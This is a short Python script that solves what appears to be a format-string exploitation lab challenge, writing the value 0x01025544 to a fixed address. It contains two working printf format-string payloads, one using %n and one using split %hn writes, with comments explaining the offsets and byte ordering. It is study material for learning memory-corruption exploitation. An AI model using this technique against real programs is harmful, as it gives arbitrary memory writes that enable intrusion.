import struct
import os

# Challenge: write 0x01025544 at 0x80496f4

''' working exploit - 1

payload = struct.pack("I", 0x80496f4) #+ "%131$08x"
payload += "%16930112d" + "%12$08n"

'''

''' Worming exploit - 2 
So the trick here is to split 0x01025544 into 0x0102 and 0x5544 and write them in two consecutive 2bytes memory addresses.

0x0102 = 258 
0x5544 = 21828

So we need to write 258 into 0x080496f6 (target + 2 address) and 21828 into 080496f4 (target address) since we are using a little indian 
system. Also, we only want to write two bytes, so we will use %hn for that.

Also, the arguments to printf will be addresses so 4 bytes each. If our buffer starts in the offset 12, 
then the next printf argument (13) will be 4 bytes from the beggining of our buffer, 
and thats where we need to place the address of the 2 LSB bytes

'''

payload = struct.pack("I",0x80496f6) + struct.pack("I",0x80496f4)
payload += "%250d" + "%12$hn" + "%21570d" + "%13$hn"

print payload
